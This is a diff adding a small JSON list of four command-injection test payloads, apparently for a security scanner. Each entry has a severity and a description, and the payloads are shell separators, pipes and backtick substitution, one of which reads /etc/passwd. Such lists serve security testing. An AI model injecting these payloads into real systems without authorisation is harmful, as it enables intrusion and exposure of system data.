@@ -1,0 +1,30 @@
+[
+    {
+        "id": "cmd_injection_basic",
+        "name": "Basic Command Injection",
+        "payload": "; ls -la",
+        "severity": "Critical",
+        "description": "Command separator injection"
+    },
+    {
+        "id": "cmd_injection_pipe",
+        "name": "Pipe Command",
+        "payload": "| cat /etc/passwd",
+        "severity": "Critical",
+        "description": "Pipe-based command injection"
+    },
+    {
+        "id": "cmd_injection_backtick",
+        "name": "Backtick Injection",
+        "payload": "`id`",
+        "severity": "High",
+        "description": "Backtick command substitution"
+    },
+    {
+        "id": "cmd_injection_windows",
+        "name": "Windows Command",
+        "payload": "& dir",
+        "severity": "Critical",
+        "description": "Windows command separator"
+    }
+]
